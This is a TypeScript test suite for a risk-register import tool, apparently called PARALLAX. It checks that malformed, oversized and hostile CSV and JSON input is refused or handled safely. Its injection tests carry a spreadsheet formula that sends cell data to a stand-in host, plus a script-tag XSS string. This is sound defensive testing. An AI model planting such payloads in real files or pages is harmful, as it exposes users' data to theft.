/**
 * Hostile and degenerate input.
 *
 * A risk register arrives as a file one human was handed by another. It may be
 * malformed, enormous, or written by somebody who wanted it to do something.
 * Everything here asserts the same property: PARALLAX produces a readable
 * error or a correct analysis, and never hangs, never throws something
 * unhandled, and never leaks a field's contents into a message.
 */

import { readFileSync } from 'node:fs'
import { dirname, join } from 'node:path'
import { fileURLToPath } from 'node:url'
import { describe, expect, it } from 'vitest'
import { analyse } from './report.ts'
import { exportReport } from './export.ts'
import { ImportError, asImportError } from './errors.ts'
import { importRegister, parseTable } from './import.ts'
import { defaultModel } from './scales.ts'
import { MAX_COLUMNS, MAX_FILE_BYTES, MAX_ROWS } from './limits.ts'

const MODEL = defaultModel(5)
const HEADER = 'id,title,likelihood,impact'

function importOf(body: string): ReturnType<typeof importRegister> {
  return importRegister('r.csv', `${HEADER}\n${body}`, MODEL)
}

describe('malformed input', () => {
  it('survives a lone CR inside a quoted field', () => {
    const built = importOf('R-1,"line one\rline two",2,5\n')
    expect(built.register.risks[0]?.title).toContain('line')
  })

  it('survives a field with no closing quote by refusing the file', () => {
    expect(() => importOf('R-1,"never closed,2,5\n')).toThrow(ImportError)
  })

  it('survives every field being empty', () => {
    const built = importOf(',,,\n')
    expect(built.register.risks).toHaveLength(1)
    expect(built.register.risks[0]?.likelihood).toBeNull()
    const report = analyse(built.register, built.issues)
    expect(report.summary.risksAnalysed).toBe(0)
    expect(report.summary.risksExcluded).toBe(1)
  })

  it('analyses a register in which nothing at all can be placed', () => {
    const built = importOf('R-1,a,,\nR-2,b,,\n')
    const report = analyse(built.register, built.issues)
    expect(report.summary.occupiedCells).toBe(0)
    expect(report.ordinal.state).toBe('insufficient-data')
    expect(report.quantification).toHaveLength(0)
    expect(report.calibration.state).toBe('insufficient-data')
    // And it still explains itself rather than rendering blank.
    expect(report.ordinal.explanation.what.length).toBeGreaterThan(10)
  })

  it('analyses a register with exactly one risk', () => {
    const report = analyse(importOf('R-1,only,3,3\n').register)
    expect(report.summary.comparedPairs).toBe(0)
    expect(report.inversions).toHaveLength(0)
    expect(report.summary.occupiedCells).toBe(1)
  })

  it('refuses a file past the byte limit before parsing it', () => {
    const huge = `${HEADER}\n${'x'.repeat(MAX_FILE_BYTES + 1)}`
    expect(() => parseTable('r.csv', huge)).toThrow(ImportError)
  })

  it('refuses a file past the row limit', () => {
    const rows = `R,x,1,1\n`.repeat(MAX_ROWS + 1)
    expect(() => importOf(rows)).toThrow(ImportError)
  })

  it('refuses a header past the column limit', () => {
    const wide = Array.from({ length: MAX_COLUMNS + 1 }, (_, i) => `c${i}`).join(',')
    expect(() => parseTable('r.csv', `${wide}\n1\n`)).toThrow(ImportError)
  })

  it('truncates an absurdly long field instead of carrying it', () => {
    const table = parseTable('r.csv', `a,b\n1,${'y'.repeat(50_000)}\n`)
    expect((table.rows[0]?.[1] ?? '').length).toBeLessThanOrEqual(4000)
    expect(table.warnings.join(' ')).toMatch(/longer than/)
  })

  it('gives every import error a remedy a non-programmer can act on', () => {
    const cases = ['', 'a,b\n"x\n', '[1,2,3]']
    for (const text of cases) {
      try {
        parseTable('r.csv', text)
      } catch (error) {
        const failure = asImportError(error)
        expect(failure.message.length).toBeGreaterThan(10)
        expect(failure.remedy.length).toBeGreaterThan(20)
        // Never a stack trace, never a token offset with no explanation.
        expect(failure.message).not.toMatch(/undefined|NaN|\[object/)
      }
    }
  })
})

describe('extreme values', () => {
  it('handles a loss interval spanning nine orders of magnitude', () => {
    const built = importRegister(
      'r.csv',
      [
        'id,title,likelihood,impact,freq min,freq max,loss min,loss max',
        'R-1,wide,3,3,0.001,100,1,1000000000',
      ].join('\n'),
      MODEL,
    )
    const report = analyse(built.register, built.issues)
    const model = report.models.get('R-1')
    expect(model).toBeDefined()
    const candidate = report.triaged.find((c) => c.riskId === 'R-1')
    expect(candidate?.components.every((c) => Number.isFinite(c.value))).toBe(true)
    expect(Number.isFinite(candidate?.priority ?? Number.NaN)).toBe(true)
  })

  it('ignores a negative estimate rather than taking a logarithm of it', () => {
    const built = importRegister(
      'r.csv',
      [
        'id,title,likelihood,impact,freq min,freq max,loss min,loss max',
        'R-1,negative,3,3,-5,10,-100,1000',
      ].join('\n'),
      MODEL,
    )
    expect(built.issues.some((i) => i.code === 'negative-quantity')).toBe(true)
    const report = analyse(built.register, built.issues)
    // Falls back to the cell anchors, which are positive by construction.
    expect(report.models.get('R-1')?.frequencySource).toBe('scale-anchor')
  })

  it('reports an inverted interval rather than silently swapping it', () => {
    const built = importRegister(
      'r.csv',
      [
        'id,title,likelihood,impact,freq min,freq max,loss min,loss max',
        'R-1,backwards,3,3,10,1,1000,100',
      ].join('\n'),
      MODEL,
    )
    expect(built.issues.some((i) => i.code === 'interval-inverted')).toBe(true)
    const report = analyse(built.register, built.issues)
    expect(report.models.get('R-1')?.frequencySource).toBe('scale-anchor')
  })

  it('analyses a register where every risk shares one cell', () => {
    const rows = Array.from({ length: 40 }, (_, i) => `R-${i},same,3,3`).join('\n')
    const report = analyse(importOf(`${rows}\n`).register)
    expect(report.summary.comparedPairs).toBe(0)
    expect(report.summary.largestTieGroup).toBe(40)
    expect(report.confidence.orderDeterminacy).toBe(0)
  })

  it('analyses a register that occupies every cell exactly once', () => {
    const rows: string[] = []
    for (let l = 1; l <= 5; l += 1) {
      for (let i = 1; i <= 5; i += 1) rows.push(`R-${l}${i},cell,${l},${i}`)
    }
    const report = analyse(importOf(`${rows.join('\n')}\n`).register)
    expect(report.summary.occupiedCells).toBe(25)
    expect(report.summary.indeterminatePairs).toBeGreaterThan(0)
  })
})

describe('injection through the register', () => {
  it('neutralises a formula smuggled in through a risk title on export', () => {
    const hostile = '=HYPERLINK("https://example.invalid/?"&A1,"click")'
    const built = importRegister(
      'r.csv',
      // Quoted per RFC 4180, with the inner quotes doubled, which is what a
      // spreadsheet would actually write when exporting this cell.
      `${HEADER}\nR-1,"${hostile.replace(/"/g, '""')}",3,3\n`,
      MODEL,
    )
    expect(built.register.risks[0]?.title).toBe(hostile)

    const report = analyse(built.register, built.issues)
    for (const id of ['register', 'compression', 'inversions', 'shortlist'] as const) {
      const csv = exportReport(report, id)
      // The title may appear; it must never appear at the start of a cell
      // without the apostrophe that makes a spreadsheet read it as text.
      const dangerous = csv.split('\r\n').some((line) =>
        line.split(',').some((cell) => /^[=+@\t\r]/.test(cell) || /^"[=+@\t\r]/.test(cell)),
      )
      expect(dangerous, `${id} exported a live formula`).toBe(false)
    }
  })

  it('does not execute or resolve anything in a description', () => {
    const built = importRegister(
      'r.csv',
      `id,title,description,likelihood,impact\nR-1,x,"<script>alert(1)</script>",3,3\n`,
      MODEL,
    )
    // Stored verbatim, rendered as text by React, never parsed as markup here.
    expect(built.register.risks[0]?.description).toBe('<script>alert(1)</script>')
  })

  it('keeps field contents out of error messages', () => {
    const secret = 'ACME-CONFIDENTIAL-PROJECT-NIGHTJAR'
    try {
      importRegister('r.csv', `${HEADER}\nR-1,"${secret},3,3\n`, MODEL)
      throw new Error('should have thrown')
    } catch (error) {
      const failure = asImportError(error)
      const text = `${failure.message} ${failure.detail} ${failure.remedy}`
      expect(text).not.toContain(secret)
    }
  })
})

/* -------------------------------------------------------------------------- */
/* The committed fixtures                                                     */
/* -------------------------------------------------------------------------- */

describe('fixtures/malformed', () => {
  const dir = join(dirname(fileURLToPath(import.meta.url)), '..', '..', 'fixtures', 'malformed')
  const read = (name: string): string => readFileSync(join(dir, name), 'utf8')

  it('refuses the files that cannot be read at all', () => {
    for (const name of ['unterminated-quote.csv', 'empty.csv', 'blank-header.csv', 'header-only.csv']) {
      expect(() => importRegister(name, read(name), MODEL), name).toThrow(ImportError)
    }
    for (const name of ['not-json.json', 'json-not-a-list.json']) {
      expect(() => importRegister(name, read(name), MODEL), name).toThrow(ImportError)
    }
  })

  it('reads the files that are awkward but recoverable', () => {
    const bom = importRegister('bom-and-crlf.csv', read('bom-and-crlf.csv'), MODEL)
    expect(bom.register.risks).toHaveLength(2)
    expect(bom.register.risks[0]?.likelihood).toBe(2)

    const cr = importRegister('lone-cr-in-field.csv', read('lone-cr-in-field.csv'), MODEL)
    expect(cr.register.risks[0]?.title).toContain('line')

    const ragged = importRegister('ragged-rows.csv', read('ragged-rows.csv'), MODEL)
    expect(ragged.register.risks).toHaveLength(3)
    expect(ragged.notes.join(' ')).toMatch(/did not have exactly/)

    const wrapped = importRegister('json-wrapped.json', read('json-wrapped.json'), MODEL)
    expect(wrapped.register.risks[0]?.impact).toBe(4)
  })

  it('classifies every bad level as its own kind of problem', () => {
    const built = importRegister('out-of-range-levels.csv', read('out-of-range-levels.csv'), MODEL)
    const codes = new Set(built.issues.map((i) => i.code))
    expect(codes).toContain('level-out-of-range')
    expect(codes).toContain('level-not-a-number')
    expect(codes).toContain('missing-likelihood')
    // Nothing usable survives, and the analysis says so rather than pretending.
    const report = analyse(built.register, built.issues)
    expect(report.summary.risksAnalysed).toBe(0)
    expect(report.summary.risksExcluded).toBe(5)
  })

  it('never repairs a bad interval silently', () => {
    const built = importRegister('inverted-intervals.csv', read('inverted-intervals.csv'), MODEL)
    const codes = new Set(built.issues.map((i) => i.code))
    expect(codes).toContain('interval-inverted')
    expect(codes).toContain('interval-incomplete')
    expect(codes).toContain('negative-quantity')
    const report = analyse(built.register, built.issues)
    for (const id of ['R-1', 'R-2', 'R-3']) {
      expect(report.models.get(id)?.frequencySource, id).toBe('scale-anchor')
    }
  })

  it('exports the injection fixture with every formula neutralised', () => {
    const built = importRegister('formula-injection.csv', read('formula-injection.csv'), MODEL)
    const report = analyse(built.register, built.issues)
    const csv = exportReport(report, 'register')
    for (const line of csv.split('\r\n')) {
      for (const cell of line.split(',')) {
        expect(/^"?[=+@\t\r]/.test(cell), cell.slice(0, 40)).toBe(false)
      }
    }
  })
})
